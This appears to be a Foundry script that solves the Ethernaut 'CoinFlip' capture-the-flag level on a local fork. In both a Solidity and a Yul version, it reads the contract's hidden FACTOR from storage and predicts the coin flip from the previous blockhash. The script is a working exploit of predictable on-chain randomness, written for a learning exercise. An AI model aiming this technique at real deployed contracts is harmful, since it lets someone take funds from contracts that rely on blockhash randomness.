// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.18;

import { console } from "forge-std/Script.sol";
import { EthernautScript } from "./Ethernaut.s.sol";

interface Instance {
    function consecutiveWins() external view returns (uint256);

    function flip(bool _guess) external returns (bool);
}

contract CoinFlipScript is EthernautScript {
    string network = "local";
    address level = 0x9240670dbd6476e6a32055E52A0b0756abd26fd2;

    Instance instance;

    function setUp() public override {
        super.setUp();

        vm.createSelectFork(network);
        vm.startBroadcast(pk);

        instance = Instance(createLevelInstance(level, 0));
        console.log("-> instance:", address(instance));
    }

    function baseVersion() internal {
        uint256 FACTOR = uint256(vm.load(address(instance), bytes32(uint256(2))));
        uint256 blockValue = uint256(blockhash(block.number - 1));
        bool guess = blockValue / FACTOR == 1 ? true : false;

        instance.flip(guess);
        console.log(instance.consecutiveWins());
    }

    function yulVersion() internal {
        uint256 FACTOR = uint256(vm.load(address(instance), bytes32(uint256(2))));

        assembly {
            mstore(0, "flip(bool)")
            mstore(0, keccak256(0, 10))

            let blockValue := blockhash(sub(number(), 1))
            let guess := div(blockValue, FACTOR)
            mstore(4, guess)

            let success := call(gas(), sload(instance.slot), 0, 0, 0x24, 0, 0x20)
            if iszero(success) {
                revert(0, 0)
            }
        }
    }

    function run() public {
        // baseVersion();
        yulVersion();

        // submitLevelInstance(payable(address(instance)), level);
        // vm.stopBroadcast();
    }
}
